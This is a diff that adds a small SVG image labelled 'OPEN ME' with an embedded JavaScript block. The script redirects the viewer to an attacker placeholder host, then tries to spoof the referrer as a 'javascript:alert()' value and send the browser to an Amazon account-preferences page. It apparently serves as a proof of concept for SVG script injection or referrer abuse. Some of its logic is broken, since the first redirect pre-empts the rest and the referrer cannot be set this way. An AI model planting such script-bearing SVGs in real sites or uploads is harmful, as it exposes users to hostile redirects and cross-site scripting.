@@ -1,0 +1,11 @@
+<svg viewBox="0 0 500 500" xmlns="http://www.w3.org/2000/svg">
+  <text style="fill: rgb(255, 0, 0); font-family: Arial, sans-serif; font-size: 75px; white-space: pre; transform-box: fill-box; transform-origin: 172.941px 41.8121px;" transform="matrix(1.022518, -0.3964, 1.170335, 3.01889, 62.512772, 63.617416)" x="2.815" y="186.374">OPEN ME</text>
+   <script type="text/javascript">
+      window.location.href = "https://attacker.com";
+      const url = 'https://www.amazon.com/customer-preferences/edit?ref_=icp_cop_flyout_change';
+      const referer = 'javascript:alert()';
+            document.referrer = referer;
+      window.location.href = url;
+
+   </script>
+</svg>
